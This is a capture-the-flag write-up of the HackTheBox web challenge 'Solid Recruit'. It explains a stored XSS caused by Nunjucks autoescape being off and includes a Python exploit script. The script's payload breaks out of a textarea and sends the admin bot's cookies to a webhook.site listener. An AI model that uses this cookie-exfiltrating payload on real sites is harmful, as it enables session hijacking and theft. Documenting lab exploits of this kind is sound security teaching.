# Solid Recruit — Writeup

**Challenge:** Solid Recruit  
**Category:** Web  
**Platform:** HackTheBox / ADF 2026 Hackathon  
**Flag:** `HTB{attr1but3s_4r3_m34nt_t0_b3_3sc4p3d}`

---

## Challenge Overview

A recruitment portal built with Node.js/Express and Nunjucks templating. Users register, fill out a recruitment form, and an admin bot reviews submissions. The flag is stored as a cookie in the bot's browser session.

## How We Solved It — Reasoning

### Phase 1: Source Code Analysis

Examining the provided source code revealed the critical vulnerability immediately:

**`index.js` line 14-16:**
```javascript
nunjucks.configure('views', {
    autoescape: false,
    express: app
});
```

Nunjucks `autoescape: false` means template variables are rendered **without HTML escaping**. This is the root cause.

**`bot.js` lines 27-31:**
```javascript
await page.setCookie({
    name: "flag",
    value: 'HTB{f4k3_fl4g_f0r_t3st1ng}',
    domain: "127.0.0.1:1337"
});
await page.goto(`http://127.0.0.1:1337/review?username=${username}`, {
    waitUntil: 'networkidle2',
    timeout: 5000
});
```

The bot sets the flag as a cookie on `127.0.0.1:1337` then visits the user's submitted form data.

**`dashboard.html` — vulnerable rendering:**
```html
<textarea id="biography">{{ formData.biography }}</textarea>
<input ... value="{{ formData.full_name }}"/>
```

All 10 form fields are rendered via `{{ }}` with `autoescape: false` — completely unescaped.

**`routes/index.js` — the trigger (`/api/enroll`):**
```javascript
router.post('/api/enroll', AuthMiddleware, async (req, res) => {
    // ... stores form data in DB ...
    botVisting = true;
    await bot.reviewForm(req.data.username);  // <-- bot visits your form!
    botVisting = false;
});
```

After saving the form data, the server immediately triggers the bot to review it.

### Phase 2: Attack Design

The chain is straightforward:

1. **Register** a user account
2. **Login** to get a session JWT cookie
3. **POST to `/api/enroll`** with 10 form fields (the endpoint requires exactly 10 keys). One field contains an XSS payload
4. The bot visits `/review?username=<user>` which renders our XSS payload
5. The XSS reads `document.cookie` (which contains `flag=HTB{...}`) and exfiltrates it

**Payload choice:** The `biography` field renders inside a `<textarea>` tag, making it the cleanest injection point:
```html
</textarea><script>fetch("https://webhook.site/UUID/?c="+encodeURIComponent(document.cookie))</script>
```

Breaking out of `<textarea>` with `</textarea>` then injecting a `<script>` tag that fetches to a webhook.site listener.

### Phase 3: Exploitation

```python
import requests

TARGET = "http://154.57.164.73:32566"
WEBHOOK = "19c597f4-..."

s = requests.Session()

# Register + Login
s.post(f"{TARGET}/api/register", json={"username": "xsser_abc", "password": "hack123"})
s.post(f"{TARGET}/api/login", json={"username": "xsser_abc", "password": "hack123"})

# XSS payload in biography
xss = '</textarea><script>fetch("https://webhook.site/UUID/?c="+encodeURIComponent(document.cookie))</script>'

# Send enroll with exactly 10 keys
s.post(f"{TARGET}/api/enroll", json={
    "full_name": "X", "phone": "X", "birth_date": "2000-01-01",
    "gender": "male", "address_1": "X", "address_2": "X",
    "city": "X", "state": "X", "zip": "X",
    "biography": xss
})
```

The webhook captured:
```
GET /?c=flag%3DHTB%7Battr1but3s_4r3_m34nt_t0_b3_3sc4p3d%7D
```

URL-decoded: `flag=HTB{attr1but3s_4r3_m34nt_t0_b3_3sc4p3d}`

---

## Key Insights

- **`autoescape: false` is the root cause** — Nunjucks' default is `autoescape: true`. Setting it to false opens every template variable to XSS
- **The `<textarea>` context** made injection trivial — just `</textarea><script>...</script>`, no need to break out of attributes
- **Bot architecture** is the classic CTF pattern: store XSS → bot visits with privileged cookie → exfiltrate
- **Flag meaning:** "attributes are meant to be escaped" — a pun on the missing HTML attribute escaping

## Flag

```
HTB{attr1but3s_4r3_m34nt_t0_b3_3sc4p3d}
```
